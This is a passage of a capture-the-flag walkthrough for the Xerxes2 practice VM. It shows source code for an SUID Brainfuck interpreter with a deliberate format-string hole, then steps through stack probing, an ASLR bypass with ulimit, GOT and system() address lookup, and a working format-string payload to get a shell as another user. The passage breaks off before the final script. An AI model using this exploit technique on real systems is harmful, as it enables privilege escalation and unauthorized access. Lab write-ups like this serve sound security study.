</span><span class='line'> <span class="sb">`</span>MM<span class="sb">`</span> ,P  6M<span class="s1">&#39;  `Mb MM69 &quot;  `MM` ,P  6M&#39;</span>  <span class="sb">`</span>Mb MM<span class="s1">&#39;    ` MM&#39;</span>  <span class="sb">`</span>Mb
</span><span class='line'>  <span class="sb">`</span>MM,P   MM    MM MM<span class="s1">&#39;      `MM,P   MM    MM YM.           ,MM</span>
</span><span class='line'><span class="s1">   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;</span>
</span><span class='line'>   d<span class="sb">`</span>MM.  MM       MM        d<span class="sb">`</span>MM.  MM            <span class="sb">`</span>Mb   ,M<span class="s1">&#39;</span>
</span><span class='line'><span class="s1">  d&#39;</span> <span class="sb">`</span>MM. YM    d9 MM       d<span class="s1">&#39; `MM. YM    d9 L    ,MM ,M&#39;</span>
</span><span class='line'>_d_  _<span class="o">)</span>MM_ YMMMM9 _MM_    _d_  _<span class="o">)</span>MM_ YMMMM9  MYMMMM9  MMMMMMMM
</span><span class='line'>
</span><span class='line'>/usr/bin/xauth:  file /home/delacroix/.Xauthority does not exist
</span><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://img3.wikia.nocookie.net/__cb20140515210256/sailormoon/images/3/3c/Stephen-colbert-celebration-gif.gif" alt="" /></p>

<hr />

<h2>Aboard the Von Braun with Marie</h2>

<p><img src="http://img2.wikia.nocookie.net/__cb20111214193445/shodan/images/b/b0/Marie_Delacroix.png" alt="" /></p>

<p>This is <a href="http://shodan.wikia.com/wiki/Marie_Delacroix">Marie Delacroix</a> - creator of <a href="http://shodan.wikia.com/wiki/Sarah">Sarah</a> which Xerxes was employed to run.</p>

<p>First things first, lets get a list of possible users from /etc/passwd</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>cat /etc/passwd
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>Debian-exim:x:101:103::/var/spool/exim4:/bin/false
</span><span class='line'>statd:x:102:65534::/var/lib/nfs:/bin/false
</span><span class='line'>sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>korenchkin:x:1000:1000:Anatoly Korenchkin,,,:/home/korenchkin:/bin/bash
</span><span class='line'>polito:x:1001:1001:Janice Polito,,,:/home/polito:/bin/bash
</span><span class='line'>delacroix:x:1002:1002:Marie St. Anne Delacroix,,,:/home/delacroix:/bin/bash
</span></code></pre></td></tr></table></div></figure>


<p>The delacroix user has source code for an application in their home folder.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/* found this lingering around somewhere */</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define BUF_SIZE 30000</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">bf</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">program</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>
</span><span class='line'>  <span class="kt">int</span> <span class="n">programcounter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">datapointer</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">while</span> <span class="p">(</span><span class="n">program</span><span class="p">[</span><span class="n">programcounter</span><span class="p">])</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>      <span class="k">switch</span><span class="p">(</span><span class="n">program</span><span class="p">[</span><span class="n">programcounter</span><span class="p">])</span>
</span><span class='line'>      <span class="p">{</span>
</span><span class='line'>          <span class="k">case</span> <span class="sc">&#39;.&#39;</span><span class="o">:</span>
</span><span class='line'>              <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%c&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="n">datapointer</span><span class="p">]);</span>
</span><span class='line'>              <span class="k">break</span><span class="p">;</span>
</span><span class='line'>          <span class="k">case</span> <span class="sc">&#39;,&#39;</span><span class="o">:</span>
</span><span class='line'>              <span class="n">buf</span><span class="p">[</span><span class="n">datapointer</span><span class="p">]</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
</span><span class='line'>              <span class="k">break</span><span class="p">;</span>
</span><span class='line'>          <span class="k">case</span> <span class="sc">&#39;&gt;&#39;</span><span class="o">:</span>
</span><span class='line'>              <span class="n">datapointer</span> <span class="o">=</span> <span class="p">(</span><span class="n">datapointer</span> <span class="o">==</span> <span class="p">(</span><span class="n">BUF_SIZE</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="o">++</span><span class="n">datapointer</span><span class="p">;</span>
</span><span class='line'>              <span class="k">break</span><span class="p">;</span>
</span><span class='line'>          <span class="k">case</span> <span class="sc">&#39;&lt;&#39;</span><span class="o">:</span>
</span><span class='line'>              <span class="n">datapointer</span> <span class="o">=</span> <span class="p">(</span><span class="n">datapointer</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="n">BUF_SIZE</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">:</span> <span class="o">--</span><span class="n">datapointer</span><span class="p">;</span>
</span><span class='line'>              <span class="k">break</span><span class="p">;</span>
</span><span class='line'>          <span class="k">case</span> <span class="sc">&#39;+&#39;</span><span class="o">:</span>
</span><span class='line'>              <span class="n">buf</span><span class="p">[</span><span class="n">datapointer</span><span class="p">]</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>              <span class="k">break</span><span class="p">;</span>
</span><span class='line'>          <span class="k">case</span> <span class="sc">&#39;-&#39;</span><span class="o">:</span>
</span><span class='line'>              <span class="n">buf</span><span class="p">[</span><span class="n">datapointer</span><span class="p">]</span><span class="o">--</span><span class="p">;</span>
</span><span class='line'>              <span class="k">break</span><span class="p">;</span>
</span><span class='line'>          <span class="k">case</span> <span class="sc">&#39;[&#39;</span><span class="o">:</span>
</span><span class='line'>              <span class="k">if</span> <span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">datapointer</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>              <span class="p">{</span>
</span><span class='line'>                  <span class="kt">int</span> <span class="n">indent</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>                  <span class="k">while</span> <span class="p">(</span><span class="n">indent</span><span class="p">)</span>
</span><span class='line'>                  <span class="p">{</span>
</span><span class='line'>                      <span class="n">programcounter</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>                      <span class="k">if</span> <span class="p">(</span><span class="n">program</span><span class="p">[</span><span class="n">programcounter</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;]&#39;</span><span class="p">)</span>
</span><span class='line'>                      <span class="p">{</span>
</span><span class='line'>                          <span class="n">indent</span><span class="o">--</span><span class="p">;</span>
</span><span class='line'>                      <span class="p">}</span>
</span><span class='line'>                      <span class="k">if</span> <span class="p">(</span><span class="n">program</span><span class="p">[</span><span class="n">programcounter</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;[&#39;</span><span class="p">)</span>
</span><span class='line'>                      <span class="p">{</span>
</span><span class='line'>                          <span class="n">indent</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>                      <span class="p">}</span>
</span><span class='line'>                  <span class="p">}</span>
</span><span class='line'>              <span class="p">}</span>
</span><span class='line'>              <span class="k">break</span><span class="p">;</span>
</span><span class='line'>          <span class="k">case</span> <span class="sc">&#39;]&#39;</span><span class="o">:</span>
</span><span class='line'>              <span class="k">if</span> <span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">datapointer</span><span class="p">])</span>
</span><span class='line'>              <span class="p">{</span>
</span><span class='line'>                  <span class="kt">int</span> <span class="n">indent</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>                  <span class="k">while</span> <span class="p">(</span><span class="n">indent</span><span class="p">)</span>
</span><span class='line'>                  <span class="p">{</span>
</span><span class='line'>                      <span class="n">programcounter</span><span class="o">--</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>                      <span class="k">if</span> <span class="p">(</span><span class="n">program</span><span class="p">[</span><span class="n">programcounter</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;]&#39;</span><span class="p">)</span>
</span><span class='line'>                      <span class="p">{</span>
</span><span class='line'>                          <span class="n">indent</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>                      <span class="p">}</span>
</span><span class='line'>                      <span class="k">if</span> <span class="p">(</span><span class="n">program</span><span class="p">[</span><span class="n">programcounter</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;[&#39;</span><span class="p">)</span>
</span><span class='line'>                      <span class="p">{</span>
</span><span class='line'>                          <span class="n">indent</span><span class="o">--</span><span class="p">;</span>
</span><span class='line'>                      <span class="p">}</span>
</span><span class='line'>                  <span class="p">}</span>
</span><span class='line'>              <span class="p">}</span>
</span><span class='line'>              <span class="k">break</span><span class="p">;</span>
</span><span class='line'>          <span class="k">case</span> <span class="sc">&#39;#&#39;</span><span class="o">:</span>
</span><span class='line'>              <span class="c1">// new feature</span>
</span><span class='line'>              <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</span><span class='line'>              <span class="k">break</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="n">programcounter</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUF_SIZE</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;usage: %s [program]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>          <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span><span class='line'>  <span class="n">bf</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">buf</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>It looks like some kind of interpreter - what language uses +-&lt;>,. and # ? Well, I know for a fact that <a href="http://en.wikipedia.org/wiki/Brainfuck">Brainfuck</a> uses all but #, and the source code says that # is a new function. Maybe this is a Brainfuck interpreter (please don&rsquo;t let it be Brainfuck). It looks like a compiled version of this code is available in /opt, so lets pass it a Hello World program to see if our assumption is true.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>/opt/bf <span class="s2">&quot;++++++++[&gt;++++[&gt;++&gt;+++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]&gt;+&gt;+&gt;-&gt;&gt;+[&lt;]&lt;-]&gt;&gt;.&gt;---.+++++++..+++.&gt;&gt;.&lt;-.&lt;.+++.------.--------.&gt;&gt;+.&gt;++.&quot;</span>
</span><span class='line'>Hello World!
</span><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Yup, it&rsquo;s Brainfuck. Shit.</p>

<p><img src="http://files.abovetopsecret.com/files/img/gm5273ef16.gif" alt="" /></p>

<p>However, it is owned by the polito user, and has SUID set.</p>

<p>The source code for the newly added # command indicates that it will be susceptible to a formatstring vulnerability - you can read about my forays in formatstr in my Hell writeup, but this one took a LOT longer. After I prodded around for a bit, I decided that I would overwrite the printf() pointer in the global offset table with the memory address of system() by calling # with a formatstring buffer, then call the newly redirected # command with a buffer of /bin/sh. This should technically run /bin/sh for me.</p>

<p>So, lets start basic. Here&rsquo;s my process of trying to find things in the stack.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;AAAA%17$x&#39;</span> <span class="p">|</span> /opt/bf <span class="s1">&#39;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,#&#39;</span>
</span><span class='line'>AAAA24373125
</span><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;AAA%17$xBBBB.%18$x....%19$x...&#39;</span> <span class="p">|</span> /opt/bf <span class="s1">&#39;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,#&#39;</span>
</span><span class='line'>AAA78243731BBBBB.42424242....31252e42
</span><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;AAAA%16$x&#39;</span> <span class="p">|</span> /opt/bf <span class="s1">&#39;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,#&#39;</span>
</span><span class='line'>AAAA41414141
</span></code></pre></td></tr></table></div></figure>


<p>OK, so I can put things into the buffer and find them in the stack. However, there&rsquo;s a gotcha - ASLR is enabled on this box - we need to circumvent that. Could I write an application that has ASLR disabled, and run that, then use the system location from that and call it ? Probably&hellip; what about gdb, I know that <a href="http://www.outflux.net/blog/archives/2010/07/03/gdb-turns-off-aslr/">disables ASLR</a>, but it also disables SUID, so that&rsquo;s out. Google to the rescue ! The <a href="http://security.cs.pub.ro/hexcellents/wiki/kb/exploiting/home">following site</a> helpfully tells me that <code>ulimit -s unlimited</code> disables ASLR on 32bit systems, so that&rsquo;s my golden ticket.</p>

<p>So, with ASLR temporarily disabled, I can find the location for the printf got pointer using objdump.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span><span class="nb">ulimit</span> -s unlimited
</span><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>objdump -R /opt/bf
</span><span class='line'>
</span><span class='line'>/opt/bf:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>DYNAMIC RELOCATION RECORDS
</span><span class='line'>OFFSET   TYPE              VALUE
</span><span class='line'>08049a38 R_386_GLOB_DAT    __gmon_start__
</span><span class='line'>08049a48 R_386_JUMP_SLOT   <span class="nb">printf</span>
</span><span class='line'>08049a4c R_386_JUMP_SLOT   getchar
</span><span class='line'>08049a50 R_386_JUMP_SLOT   __gmon_start__
</span><span class='line'>08049a54 R_386_JUMP_SLOT   <span class="nb">exit</span>
</span><span class='line'>08049a58 R_386_JUMP_SLOT   __libc_start_main
</span><span class='line'>08049a5c R_386_JUMP_SLOT   memset
</span><span class='line'>08049a60 R_386_JUMP_SLOT   putchar
</span></code></pre></td></tr></table></div></figure>


<p>printf is at 08049a48. Now I have to find system(). gdb can help with that.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>gdb /opt/bf
</span><span class='line'>GNU gdb <span class="o">(</span>GDB<span class="o">)</span> 7.4.1-debian
</span><span class='line'>Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2012</span> Free Software Foundation, Inc.
</span><span class='line'>License GPLv3+: GNU GPL version <span class="m">3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;
</span><span class='line'>This is free software: you are free to change and redistribute it.
</span><span class='line'>There is NO WARRANTY, to the extent permitted by law.  Type <span class="s2">&quot;show copying&quot;</span>
</span><span class='line'>and <span class="s2">&quot;show warranty&quot;</span> <span class="k">for</span> details.
</span><span class='line'>This GDB was configured as <span class="s2">&quot;i486-linux-gnu&quot;</span>.
</span><span class='line'>For bug reporting instructions, please see:
</span><span class='line'>&lt;http://www.gnu.org/software/gdb/bugs/&gt;...
</span><span class='line'>Reading symbols from /opt/bf...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break </span>main
</span><span class='line'>Breakpoint <span class="m">1</span> at 0x8048687
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run
</span><span class='line'>Starting program: /opt/bf
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x08048687 in main <span class="o">()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> p system
</span><span class='line'><span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0x40062000 &lt;system&gt;
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> p <span class="nb">printf</span>
</span><span class='line'><span class="nv">$2</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0x4006ff50 &lt;<span class="nb">printf</span>&gt;
</span></code></pre></td></tr></table></div></figure>


<p>I need to overwrite 0x08049a48 with 0x40062000 - that shouldn&rsquo;t be too hard. I really only need to change the last 2 bytes from ff50 to 2000, which means I can do this with just one write. After lots of debugging I ended up at the following</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">echo</span> <span class="k">$(</span>python -c <span class="s2">&quot;print &#39;\x48\x9a\x04\x08&#39;&quot;</span><span class="k">)</span>%8186u%16<span class="se">\$</span>hn <span class="p">|</span> /opt/bf <span class="s1">&#39;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,##&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>I have many conversations with people on IRC, where I like to think aloud with people I talk to on a regular basis. c0ne helped me with the formatstr on Hell, so it was natural I&rsquo;d talk to him</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>[23:16:17]  &lt;recrudesce&gt;   delacroix@xerxes2:~$ echo &quot;ABCD&quot; | ./b &quot;,&gt;#&quot;
</span><span class='line'>[23:16:19]  &lt;recrudesce&gt;    returns A
</span><span class='line'>[23:16:24]  &lt;recrudesce&gt;    echo &quot;ABCD&quot; | ./b &quot;,&gt;&lt;,&gt;#&quot; returns B
</span><span class='line'>[23:16:30]  &lt;recrudesce&gt;    echo &quot;ABCD&quot; | ./b &quot;,&gt;&lt;,&gt;&lt;,#&quot; = C
</span><span class='line'>[23:16:36]  &lt;recrudesce&gt;    echo &quot;ABCD&quot; | ./b &quot;,&gt;&lt;,&gt;&lt;,&gt;&lt;,#&quot; = D
</span><span class='line'>[23:16:38]  &lt;recrudesce&gt;    so...
</span><span class='line'>[23:16:41]  &lt;c0ne&gt;  i get
</span><span class='line'>[23:16:49]  &lt;c0ne&gt;  so it needs placeholder to print to
</span><span class='line'>[23:16:56]  &lt;c0ne&gt;  placeholders
</span><span class='line'>[23:17:06]  &lt;c0ne&gt;  ,&gt;&lt;,&gt;&lt;,&gt;&lt;,
</span><span class='line'>[23:17:13]  &lt;c0ne&gt;  not sure how it works
</span><span class='line'>[23:18:09]  &lt;recrudesce&gt;    echo &quot;ABCDE&quot; | ./b &quot;,&gt;,&gt;,&gt;,#&lt;,&lt;&lt;&lt;,&gt;#&quot;
</span><span class='line'>[23:18:13]  &lt;recrudesce&gt;    ABCDABED
</span><span class='line'>[23:18:55]  &lt;recrudesce&gt;    echo &quot;ABCDWXYZ&quot; | ./b &quot;,&gt;,&gt;,&gt;,#&lt;&lt;&lt;,&gt;,&gt;,&gt;,#&quot;
</span><span class='line'>[23:19:18]  &lt;recrudesce&gt;    ook, so that reads ABCD into the buffer, then prints it, goes back to the start of the buffer, and reads the next 4 characters, WXYZ
</span><span class='line'>[23:19:20]  &lt;recrudesce&gt;    then prints that
</span><span class='line'>[23:19:37]  &lt;recrudesce&gt;    so, all we need to do is go back to a few pointers, and re-read some further data in
</span><span class='line'>[23:20:08]  &lt;c0ne&gt;  Oo
</span><span class='line'>[23:20:11]  &lt;recrudesce&gt;    so, we need to make sure that the correct amount of ,&gt; are before our first #
</span><span class='line'>[23:20:18]  &lt;recrudesce&gt;    else we accidently read /bin/bash too
</span></code></pre></td></tr></table></div></figure>


<p>Many many failures were experienced at this point - and I&rsquo;m talking at least 3 hours of failed executions or failed memory overwrites.  I managed to get basic command execution, but only once every 5-10 attempts would be successful due to the stack shifting ever so slightly.  Anyway, who wants to listen to my boohoo story - you came here for the answers, so here&rsquo;s what you have to do. Make a shell script in /tmp containing the following</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
